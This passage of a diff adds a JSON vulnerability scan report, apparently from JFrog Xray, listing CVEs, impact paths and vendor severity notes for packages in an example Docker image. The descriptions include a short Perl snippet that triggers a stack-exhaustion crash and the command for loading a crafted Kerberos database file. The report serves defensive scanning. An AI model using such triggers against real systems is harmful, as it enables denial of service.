+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils-x86-64-linux-gnu:2.38-4ubuntu2.3",
+                  "full_path": "binutils-x86-64-linux-gnu:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:binutils:2.38-4ubuntu2.3",
+                  "full_path": "binutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libbinutils:2.38-4ubuntu2.3",
+                  "full_path": "libbinutils:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf-nobfd0:2.38-4ubuntu2.3",
+                  "full_path": "libctf-nobfd0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libctf0:2.38-4ubuntu2.3",
+                  "full_path": "libctf0:2.38-4ubuntu2.3"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-64269",
+        "references": [
+          "https://sourceware.org/bugzilla/show_bug.cgi?id=22009",
+          "https://ubuntu.com/security/CVE-2017-13716"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-48522",
+            "cvss_v3_score": "9.8",
+            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+          }
+        ],
+        "summary": "In Perl 5.34.0, function S_find_uninit_var in sv.c has a stack-based crash that can lead to remote code execution or local privilege escalation.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:perl-base:5.34.0-3ubuntu1.2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:perl-base:5.34.0-3ubuntu1.2",
+                  "full_path": "perl-base:5.34.0-3ubuntu1.2"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-529333",
+        "references": [
+          "https://github.com/Perl/perl5/blob/79a7b254d85a10b65126ad99bf10e70480569d68/sv.c#L16336-L16345",
+          "https://ubuntu.com/security/CVE-2022-48522",
+          "https://security.netapp.com/advisory/ntap-20230915-0008/"
+        ],
+        "extended_information": {
+          "short_description": "Stack exhaustion in Perl 5.34.0 can lead to denial of service when a warning error of type `uninitialized` tries to get an undefined variable's value.",
+          "full_description": "[Perl 5 (often referred to as Perl)](https://www.perl.org/) is a high-level programming language known for its flexibility and text-processing capabilities, commonly used for scripting, automation, and web development tasks. It emphasizes readability and expressiveness, allowing developers to efficiently manipulate data and perform various tasks.\nAn issue has been discovered when handling warnings. The internal function `s_find_uninit_var()` checks for uninitialized variables. In case both the array/hash and the index are undefined, the warning mechanism tries to get the value of the index and then enters an infinite loop which causes stack exhaustion and eventually leads to Denial of Service.\n\nExample of vulnerable code:\n```perl\n#!/usr/bin/perl\nuse warnings;\n$x{$y}  # or $x[$y] where both x and y are undefined.\n```",
+          "jfrog_research_severity": "Low",
+          "jfrog_research_severity_reasons": [
+            {
+              "name": "The issue cannot result in a severe impact (such as remote code execution)",
+              "description": "The issue is not influenced from attacker input and therefore is very unlikely to exist in real-world code (since any execution of the vulnerable code would cause the infinite loop to happen)",
+              "is_positive": true
+            },
+            {
+              "name": "The prerequisites for exploiting the issue are extremely unlikely",
+              "description": "The perl script must either use the `warning` pragma or be run with the `-w` option of perl.",
+              "is_positive": true
+            },
+            {
+              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
+              "description": "The attackers must find a remote input that allows to inject of code in a Perl script running with the warnings enabled.",
+              "is_positive": true
+            }
+          ]
+        }
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2023-36054",
+            "cvss_v3_score": "6.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "lib/kadm5/kadm_rpc_xdr.c in MIT Kerberos 5 (aka krb5) before 1.20.2 and 1.21.x before 1.21.1 frees an uninitialized pointer. A remote authenticated user can trigger a kadmind crash. This occurs because _xdr_kadm5_principal_ent_rec does not validate the relationship between n_key_data and the key_data array count.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:libgssapi-krb5-2:1.19.2-2ubuntu0.2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libgssapi-krb5-2:1.19.2-2ubuntu0.2",
+                  "full_path": "libgssapi-krb5-2:1.19.2-2ubuntu0.2"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libk5crypto3:1.19.2-2ubuntu0.2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libk5crypto3:1.19.2-2ubuntu0.2",
+                  "full_path": "libk5crypto3:1.19.2-2ubuntu0.2"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libkrb5-3:1.19.2-2ubuntu0.2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libkrb5-3:1.19.2-2ubuntu0.2",
+                  "full_path": "libkrb5-3:1.19.2-2ubuntu0.2"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libkrb5support0:1.19.2-2ubuntu0.2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libkrb5support0:1.19.2-2ubuntu0.2",
+                  "full_path": "libkrb5support0:1.19.2-2ubuntu0.2"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-527713",
+        "references": [
+          "https://ubuntu.com/security/CVE-2023-36054",
+          "https://github.com/krb5/krb5/commit/ef08b09c9459551aabbe7924fb176f1583053cdd",
+          "https://web.mit.edu/kerberos/www/advisories/",
+          "https://github.com/krb5/krb5/compare/krb5-1.21-final...krb5-1.21.1-final",
+          "https://github.com/krb5/krb5/compare/krb5-1.20.1-final...krb5-1.20.2-final",
+          "https://security.netapp.com/advisory/ntap-20230908-0004/"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2018-5709",
+            "cvss_v2_score": "5.0",
+            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
+            "cvss_v3_score": "7.5",
+            "cvss_v3_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+          }
+        ],
+        "summary": "An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable \"dbentry-\u003en_key_data\" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a \"u4\" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:libgssapi-krb5-2:1.19.2-2ubuntu0.2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libgssapi-krb5-2:1.19.2-2ubuntu0.2",
+                  "full_path": "libgssapi-krb5-2:1.19.2-2ubuntu0.2"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libk5crypto3:1.19.2-2ubuntu0.2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libk5crypto3:1.19.2-2ubuntu0.2",
+                  "full_path": "libk5crypto3:1.19.2-2ubuntu0.2"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libkrb5-3:1.19.2-2ubuntu0.2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libkrb5-3:1.19.2-2ubuntu0.2",
+                  "full_path": "libkrb5-3:1.19.2-2ubuntu0.2"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libkrb5support0:1.19.2-2ubuntu0.2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libkrb5support0:1.19.2-2ubuntu0.2",
+                  "full_path": "libkrb5support0:1.19.2-2ubuntu0.2"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-86241",
+        "references": [
+          "https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/tree/master/Integer%20Overflow",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5709"
+        ],
+        "extended_information": {
+          "short_description": "(Non-issue) Integer truncation in Kerberos5 leads to no impact when processing a crafted Kerberos5 beta7 format database file.",
+          "full_description": "[Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol. It is designed to provide strong authentication for client/server applications by using secret-key cryptography. A free implementation of this protocol is available from the Massachusetts Institute of Technology. Kerberos is available in many commercial products as well.\n\nA [Kerberos database](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/database.html) contains all of a realm’s Kerberos principals, their passwords, and other administrative information about each principal. For the most part, you will use the `kdb5_util` program to manipulate the Kerberos database as a whole, and the `kadmin` program to make changes to the entries in the database. \n\nIn `kdb5_util`, there is a `process_k5beta7_princ` method responsible for adding Kerberos 5 beta 7 format data from a file to the Kerberos database. This function is vulnerable to integer overflow as a Database entry defined on 16-bits is assigned a 32-bits value from the given file. It turns out that it does not have any impact at all and it is not a security flaw.\n\nOriginally, the vulnerability was mistakenly reported as an Integer Overflow.\nThe issue should not affect any other data allocated close to the 16-bit integer in question. Furthermore, a negative value of the 16-bit integer does not impact the flow of the program in any meaningful way.\n\nTo trigger the integer truncation, an attacker has to get the user to use the `kdb5_util` utility to restore a Kerberos 5 - beta 7 format - database from a crafted malicious file. It can be done using the following command:\n```\nkdb5_util load -d DB_NAME DB_FILE \n```",
+          "jfrog_research_severity": "Low",
+          "jfrog_research_severity_reasons": [
+            {
+              "name": "Exploiting the issue requires the user to interact with the vulnerable software",
+              "description": "Requires the user to restore the Kerberos Database from a crafted malicious file, which is unlikely.",
+              "is_positive": true
+            },
+            {
+              "name": "The issue cannot result in a severe impact (such as remote code execution)",
+              "description": "The integer truncation doesn't affect data allocated near the 16-bit integer and doesn't have any meaningful impact.",
+              "is_positive": true
+            },
+            {
+              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
+              "description": "The CVSS does not reflect the fact that the vulnerability does not have any security impact.",
+              "is_positive": true
+            },
+            {
+              "name": "The prerequisites for exploiting the issue are extremely unlikely",
+              "description": "A Kerberos database is not restored often. The attacker must find a way to get the user to restore the database from a crafted file. If the attacker has access to the backup file, it can be modified even without exploiting this vulnerability. The vulnerability only helps by making the attacker's modifications to the backup file seem legitimate when manually inspected.",
+              "is_positive": true
+            }
+          ]
+        }
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2016-2781",
+            "cvss_v2_score": "2.1",
+            "cvss_v2_vector": "CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:P/A:N",
+            "cvss_v3_score": "6.5",
+            "cvss_v3_vector": "CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N"
+          }
+        ],
+        "summary": "chroot in GNU coreutils, when used with --userspec, allows local users to escape to the parent session via a crafted TIOCSTI ioctl call, which pushes characters to the terminal's input buffer.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:coreutils:8.32-4.1ubuntu1": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:coreutils:8.32-4.1ubuntu1",
+                  "full_path": "coreutils:8.32-4.1ubuntu1"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-26349",
+        "references": [
+          "https://lists.apache.org/thread.html/rf9fa47ab66495c78bb4120b0754dd9531ca2ff0430f6685ac9b07772@%3Cdev.mina.apache.org%3E",
+          "http://www.openwall.com/lists/oss-security/2016/02/28/3",
+          "http://www.openwall.com/lists/oss-security/2016/02/28/2",
+          "https://ubuntu.com/security/CVE-2016-2781"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2016-20013",
+            "cvss_v2_score": "5.0",
+            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
+            "cvss_v3_score": "7.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "sha256crypt and sha512crypt through 0.6 allow attackers to cause a denial of service (CPU consumption) because the algorithm's runtime is proportional to the square of the length of the password.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:libc-bin:2.35-0ubuntu3.4": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libc-bin:2.35-0ubuntu3.4",
+                  "full_path": "libc-bin:2.35-0ubuntu3.4"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:libc6:2.35-0ubuntu3.4": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libc6:2.35-0ubuntu3.4",
+                  "full_path": "libc6:2.35-0ubuntu3.4"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:locales:2.35-0ubuntu3.4": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557/sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar",
+                  "full_path": "sha256__fb91a4b6eff7b49b928b26475dca2a2506bd023eac4e7955203902d6253a5557.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:locales:2.35-0ubuntu3.4",
+                  "full_path": "locales:2.35-0ubuntu3.4"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-225378",
+        "references": [
+          "https://ubuntu.com/security/CVE-2016-20013",
+          "https://akkadia.org/drepper/SHA-crypt.txt",
+          "https://pthree.org/2018/05/23/do-not-use-sha256crypt-sha512crypt-theyre-dangerous/",
+          "https://twitter.com/solardiz/status/795601240151457793"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2023-29383",
+            "cvss_v3_score": "3.3",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
+          }
+        ],
+        "summary": "In Shadow 4.13, it is possible to inject control characters into fields provided to the SUID program chfn (change finger). Although it is not possible to exploit this directly (e.g., adding a new user fails because \\n is in the block list), it is possible to misrepresent the /etc/passwd file when viewed. Use of \\r manipulations and Unicode characters to work around blocking of the : character make it possible to give the impression that a new user has been added. In other words, an adversary may be able to convince a system administrator to take the system offline (an indirect, social-engineered denial of service) by demonstrating that \"cat /etc/passwd\" shows a rogue user account.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:login:1:4.8.1-2ubuntu2.1": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:login:1:4.8.1-2ubuntu2.1",
+                  "full_path": "login:1:4.8.1-2ubuntu2.1"
+                }
+              ]
+            ]
+          },
+          "deb://ubuntu:jammy:passwd:1:4.8.1-2ubuntu2.1": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:passwd:1:4.8.1-2ubuntu2.1",
+                  "full_path": "passwd:1:4.8.1-2ubuntu2.1"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-514884",
+        "references": [
+          "https://github.com/shadow-maint/shadow/pull/687",
+          "https://ubuntu.com/security/CVE-2023-29383",
+          "https://github.com/shadow-maint/shadow/commit/e5905c4b84d4fb90aefcd96ee618411ebfac663d",
+          "https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=31797",
+          "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2023-29383-abusing-linux-chfn-to-misrepresent-etc-passwd/"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2017-11164",
+            "cvss_v2_score": "7.8",
+            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:C",
+            "cvss_v3_score": "7.5",
+            "cvss_v3_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "In PCRE 8.41, the OP_KETRMAX feature in the match function in pcre_exec.c allows stack exhaustion (uncontrolled recursion) when processing a crafted regular expression.",
+        "severity": "Low",
+        "components": {
+          "deb://ubuntu:jammy:libpcre3:2:8.39-13ubuntu0.22.04.1": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:libpcre3:2:8.39-13ubuntu0.22.04.1",
+                  "full_path": "libpcre3:2:8.39-13ubuntu0.22.04.1"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-86893",
+        "references": [
+          "https://lists.apache.org/thread.html/rf9fa47ab66495c78bb4120b0754dd9531ca2ff0430f6685ac9b07772@%3Cdev.mina.apache.org%3E",
+          "http://www.openwall.com/lists/oss-security/2023/04/11/1",
+          "http://openwall.com/lists/oss-security/2017/07/11/3",
+          "http://www.securityfocus.com/bid/99575",
+          "https://ubuntu.com/security/CVE-2017-11164",
+          "http://www.openwall.com/lists/oss-security/2023/04/12/1"
+        ]
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2022-45868",
+            "cvss_v3_score": "7.8",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+          }
+        ],
+        "summary": "** DISPUTED ** The web-based admin console in H2 Database Engine through 2.1.214 can be started via the CLI with the argument -webAdminPassword, which allows the user to specify the password in cleartext for the web admin console. Consequently, a local user (or an attacker that has obtained local access through some means) would be able to discover the password by listing processes and their arguments. NOTE: the vendor states \"This is not a vulnerability of H2 Console ... Passwords should never be passed on the command line and every qualified DBA or system administrator is expected to know that.\"",
+        "severity": "High",
+        "components": {
+          "gav://com.h2database:h2:2.1.214": {
+            "fixed_versions": [
+              "[2.2.220]"
+            ],
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6/sha256__0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6.tar",
+                  "full_path": "sha256__0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6.tar"
+                },
+                {
+                  "component_id": "gav://org.springframework.samples:spring-petclinic:3.1.0-SNAPSHOT",
+                  "full_path": "spring-petclinic.jar"
+                },
+                {
+                  "component_id": "gav://com.h2database:h2:2.1.214",
+                  "full_path": "BOOT-INF/lib/h2-2.1.214.jar"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-261922",
+        "references": [
+          "https://sites.google.com/sonatype.com/vulnerabilities/sonatype-2022-6243",
+          "https://github.com/h2database/h2database/blob/96832bf5a97cdc0adc1f2066ed61c54990d66ab5/h2/src/main/org/h2/server/web/WebServer.java#L346-L347"
+        ],
+        "extended_information": {
+          "short_description": "(Non-issue) Incorrect usage of the H2 Database Engine may result in password leakage for the H2 Console.",
+          "full_description": "[h2database](https://github.com/h2database/h2database) is an open-source lightweight Java Database. H2 Database supports standard database APIs such as SQL and JDBC API. The H2 Database can also be used in embedded and server modes. H2 Database has a web-based admin console that can be initialized via the CLI. The console is accessible via tool options that are declared by the H2 Database. \n\nThe H2 console supports the `-webAdminPassword` CLI argument which takes the web admin password as a value. Specifying this password in the CLI is unsafe since local attackers will be able to see the password in plain text when the process list is shown with the arguments used to run them.\n\nThis vulnerability is a non-issue since passing passwords via the CLI is a well-known bad practice, and does not relate specifically to the H2 Database Engine.",
+          "jfrog_research_severity": "Low",
+          "jfrog_research_severity_reasons": [
+            {
+              "name": "The issue has been disputed by the vendor",
+              "description": "This vulnerability is a non-issue since passing passwords via the CLI is a well-known bad practice, and does not relate specifically to the H2 Database Engine.",
+              "is_positive": true
+            }
+          ]
+        }
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2023-3446",
+            "cvss_v3_score": "5.3",
+            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+          }
+        ],
